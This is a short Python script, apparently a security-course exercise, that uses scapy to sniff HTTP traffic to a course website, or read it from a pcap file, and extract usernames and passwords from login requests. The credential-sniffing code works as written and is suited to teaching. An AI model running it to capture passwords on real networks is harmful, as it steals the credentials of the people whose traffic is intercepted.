import scapy.all as S
import urlparse
import socket


WEBSITE = 'infosec17.cs.tau.ac.il'
HTTP_PORT = 80

def parse_packet(packet):
    """
    If this is a login request to the course website, return the username
    and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Note: You can assume the entire HTTP request fits within one packet.
    """
    # Parse the packet data
    parsed_data = urlparse.parse_qs(packet[S.TCP].load)

    username, password = (None, None)

    # If the packet has both of these we know that it is a POST request of type login.
    if parsed_data.has_key('username') and parsed_data.has_key('password'):
        username, password = parsed_data['username'][0], parsed_data['password'][0]

    return (username, password)

    


def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from the client to the server.
    """
    # Verify that the protocol is TCP.
    if S.TCP in packet:
        # Verify the application layer protocol (HTTP)
        if packet[S.IP].dport == HTTP_PORT:
            # Veryfy the destination address
            if packet[S.IP].dst == socket.gethostbyname(WEBSITE):
                if len(packet[S.TCP].payload) > 0:
                    return True
    return False


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
